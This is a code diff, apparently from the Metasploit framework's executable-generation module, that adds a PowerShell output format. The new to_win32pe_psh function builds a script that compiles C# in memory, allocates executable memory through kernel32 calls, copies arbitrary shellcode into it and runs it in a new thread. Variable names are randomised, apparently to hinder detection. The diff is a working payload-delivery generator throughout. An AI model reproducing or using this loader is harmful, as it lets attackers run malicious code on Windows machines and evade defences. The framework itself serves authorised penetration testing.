@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id: exe.rb 14286 2011-11-20 01:41:04Z rapid7 $
 ##
 
 ###
@@ -981,6 +981,55 @@ End Sub
 		vbs
 	end
 
+	def self.to_win32pe_psh(framework, code, opts={})
+		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_kernel32 = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_baseaddr = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_threadHandle = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_output = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_temp = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_codeProvider = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_compileParams = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_syscode = Rex::Text.rand_text_alpha(rand(8)+8)
+
+		code = code.unpack('C*')
+		psh = "Set-StrictMode -Version 2\r\n"
+		psh << "$#{var_syscode} = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n"
+		psh << "namespace #{var_kernel32} {\r\n"
+		psh << "public class func {\r\n"
+		psh << "[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n"
+		psh << "[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }\r\n"
+		psh << "[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n"
+		psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+		psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+		psh << "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\r\n"
+		psh << "} }\r\n"
+		psh << "\"@\r\n\r\n"
+		psh << "$#{var_codeProvider} = New-Object Microsoft.CSharp.CSharpCodeProvider\r\n"
+		psh << "$#{var_compileParams} = New-Object System.CodeDom.Compiler.CompilerParameters\r\n"
+		psh << "$#{var_compileParams}.ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))\r\n"
+		psh << "$#{var_compileParams}.GenerateInMemory = $True\r\n"
+		psh << "$#{var_output} = $#{var_codeProvider}.CompileAssemblyFromSource($#{var_compileParams}, $#{var_syscode})\r\n\r\n"
+
+		psh << "[Byte[]]$#{var_code} = 0x#{code[0].to_s(16)}"
+		lines = []
+		1.upto(code.length-1) do |byte|
+			if(byte % 10 == 0)
+				lines.push "\r\n$#{var_code} += 0x#{code[byte].to_s(16)}"
+			else
+				lines.push ",0x#{code[byte].to_s(16)}"
+			end
+		end
+		psh << lines.join("") + "\r\n\r\n"
+
+		psh << "$#{var_baseaddr} = [#{var_kernel32}.func]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.func+AllocationType]::Reserve -bOr [#{var_kernel32}.func+AllocationType]::Commit, [#{var_kernel32}.func+MemoryProtection]::ExecuteReadWrite)\r\n"
+		psh << "if ([Bool]!$#{var_baseaddr}) { $global:result = 3; return }\r\n"
+		psh << "[System.Runtime.InteropServices.Marshal]::Copy($#{var_code}, 0, $#{var_baseaddr}, $#{var_code}.Length)\r\n"
+		psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.func]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
+		psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
+		psh << "$#{var_temp} = [#{var_kernel32}.func]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.func+Time]::Infinite)\r\n"
+	end
+
 	def self.to_win32pe_vbs(framework, code, opts={})
 		to_exe_vbs(to_win32pe(framework, code, opts), opts)
 	end
@@ -1714,13 +1763,16 @@ End Sub
 			exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
 			output = Msf::Util::EXE.to_jsp_war(exe)
 
+		when 'psh'
+			output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
+
 		end
 
 		output
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war','psh']
 	end
 
 	#
